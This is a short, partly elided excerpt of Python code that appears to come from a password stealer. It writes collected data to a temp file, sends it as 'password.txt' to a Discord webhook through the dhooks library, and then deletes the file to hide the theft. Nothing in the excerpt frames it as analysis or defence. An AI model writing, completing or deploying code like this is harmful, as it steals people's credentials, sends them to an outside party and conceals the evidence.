...
def main():
    ...
    fichier2 = open(temp + "\\braskov.txt", 'a')
    ...
    hook.send("password : ", file=dhooks.File(temp + "\\braskov.txt", name="password.txt"))
    ...
    os.system("del " + temp + "\\braskov.txt")
